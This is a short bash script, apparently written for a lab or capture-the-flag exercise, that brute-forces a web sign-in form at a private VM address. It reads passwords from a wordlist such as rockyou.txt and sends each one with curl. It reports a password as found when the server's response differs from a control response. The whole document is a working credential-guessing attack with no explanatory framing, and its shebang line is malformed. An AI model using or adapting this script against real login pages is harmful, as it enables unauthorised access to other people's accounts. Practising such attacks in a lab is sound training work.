#!/usr/bin

# bash bruteforce.sh root rockyou.txt

USERNAME=$1
PASSWDS=$2
CONTROL=out.html
TESTFILE=test.html

curl -o $CONTROL "http://192.168.56.101/index.php?page=signin&username=admin&password=a&Login=Login#" 2>/dev/null
while read pass; do
	echo $pass
	curl -o $TESTFILE "http://192.168.56.101/index.php?page=signin&username=$USERNAME&password=$pass&Login=Login#" 2>/dev/null
	if [[ $(diff $TESTFILE $CONTROL) ]]; then
		echo "FOUND"
		echo $pass
		exit 0
	fi
done < $PASSWDS
